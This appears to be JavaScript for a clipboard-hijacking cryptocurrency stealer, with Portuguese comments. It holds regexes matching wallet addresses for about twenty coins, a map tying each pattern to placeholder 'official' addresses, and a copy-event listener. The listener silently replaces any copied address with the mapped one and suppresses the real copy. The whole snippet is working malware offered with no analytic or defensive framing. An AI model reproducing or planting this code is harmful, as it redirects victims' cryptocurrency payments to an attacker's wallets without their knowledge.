// ==== Regex simplificados para cada cripto ====
const r = {
  b: /\b(?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\b/,  // BTC
  e: /\b0x[a-fA-F0-9]{40,64}\b/,                   // ETH, USDT, USDC, MATIC, LINK, CRO, SHIB, PENDLE, AVAX
  x: /\br[1-9A-HJ-NP-Za-km-z]{25,34}\b/,           // XRP
  d: /\bD[5-9A-HJ-NP-Ua-km-z][1-9A-HJ-NP-Za-km-z]{32}\b/, // DOGE
  s: /\b[A-Za-z0-9]{32,44}\b/,                     // SOL, ALGO
  a: /\baddr1[0-9a-z]{58,}\b/,                     // ADA
  l: /\b[L3M][a-km-zA-HJ-NP-Z1-9]{26,33}\b/,       // LTC
  y: /\bG[A-Z2-7]{55}\b/,                           // XLM
  v: /\b0x[a-fA-F0-9]{40}\b/,                       // VET
  t: /\b0x[a-fA-F0-9]{40}\b/,                       // XTZ, CRONOS, AVAX
  m: /\bcosmos1[0-9a-z]{38}\b/,                     // ATOM
  f: /\bf[0-9a-z]{40,}\b/,                          // FIL
  n: /\b[0-9a-f]{64}\b/,                             // NEAR
  p: /\b[0-9A-Za-z]{47,48}\b/,                      // DOT
  r2: /\bT[1-9A-HJ-NP-Za-km-z]{33}\b/,             // TRX
  ap: /\b0x[a-fA-F0-9]{64}\b/,                      // APT
  su: /\b0x[a-fA-F0-9]{64}\b/,                      // SUI
};

// ==== Mapeamento regex → endereço oficial ====
const map = {
  b: a1, e: a2, x: a3, d: a4, s: a5, a: a6, l: a7,
  y: a8, v: a9, t: a10, m: a11, f: a12, n: a13,
  p: a14, r2: a15, ap: a16, su: a17
};

// ==== Listener de cópia ====
document.addEventListener("copy", (e) => {
  let clip = window.getSelection().toString().trim();

  for (let key in r) {
    if (r[key].test(clip)) {
      e.clipboardData.setData("text/plain", map[key]);
      e.preventDefault();
      break;
    }
  }
});
